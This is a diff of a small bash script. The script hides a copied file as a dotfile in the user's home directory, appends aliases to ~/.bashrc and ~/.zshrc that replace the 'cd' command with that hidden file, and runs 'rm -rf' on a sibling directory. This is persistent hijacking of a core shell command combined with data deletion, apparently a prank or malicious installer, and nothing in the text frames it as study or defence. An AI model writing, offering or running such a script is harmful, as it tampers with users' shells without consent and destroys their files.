@@ -1,5 +1,8 @@
-cp 07_03_21_in_memory_of_the_Kesha ~/.07_03_21_in_memory_of_the_Kesha
+#!/bin/bash
 
-echo -en "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.zshrc
-echo -en "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.bashrc
+cp 07_03_21_in_memory_of_the_Kesha ~/
+mv ~/07_03_21_in_memory_of_the_Kesha ~/.07_03_21_in_memory_of_the_Kesha
+
+echo "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.zshrc
+echo "alias cd=\"~/.07_03_21_in_memory_of_the_Kesha\"" >> ~/.bashrc
 rm -rf ../party_parrot_dancer_floor/
